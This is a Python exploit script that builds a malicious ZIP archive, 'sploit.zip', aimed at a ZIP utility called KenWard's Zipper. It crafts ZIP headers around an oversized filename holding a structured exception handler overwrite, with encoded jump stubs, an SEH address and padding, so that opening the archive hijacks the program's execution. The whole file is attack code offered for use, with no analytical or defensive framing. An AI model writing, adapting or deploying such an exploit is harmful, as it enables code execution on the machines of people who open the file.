#!/usr/bin/python
import struct

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

#central directory header
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
"\x00\x00\x00\x00\x00")

# end of central directory header
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")


jump2jumpEBX = "\x75\x9d"

jmpEBX  = "\x54\x5B"
jmpEBX += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jmpEBX += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jmpEBX += "\x05\x12\x77\x62\x41" ## add  eax, 0x41627712
jmpEBX += "\x05\x12\x66\x52\x41" ## add  eax, 0x41526612
jmpEBX += "\x05\x12\x55\x62\x41" ## add  eax, 0x41625512
jmpEBX += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
jmpEBX += "\x50"                 ## push eax
jmpEBX += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jmpEBX += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jmpEBX += "\x05\x33\x41\x76\x41" ## add  eax, 0x41764133
jmpEBX += "\x05\x33\x40\x75\x41" ## add  eax, 0x41754033
jmpEBX += "\x50"                 ## push eax


shortJumpForward = "\x74\x2B"

jumpBack = "\x74\x9F"

nSEH = "\x74\x9F\x75\x9F"
SEH  = struct.pack("<I", 0x00433B3B)

payload  = "A" * 773
payload += "\x61" * 83
payload += shortJumpForward
payload += "A" * 41
payload += jumpBack
payload += jmpEBX
payload += jump2jumpEBX
payload += "A" * (123 - len(jumpBack)  -len(jmpEBX) - len(jump2jumpEBX))
payload += nSEH
payload += SEH
payload += "D" * (4064 - len(payload))

payload += ".bin"

zip = ( ldf_header + payload + cdf_header + payload + eofcdf_header );

f = open("sploit.zip", "w")
f.write(zip)
f.close()

print "[*] Local file header size = 0x%x" %len(ldf_header)
print "[*] Central directory file header size = 0x%x" %len(cdf_header)
print "[*] End of central directory record size = 0x%x" %len(eofcdf_header)
print "[*] Payload size = %s bytes" %len(payload)
print "[*] sploit.zip created.  Open it with KenWard's Zipper."

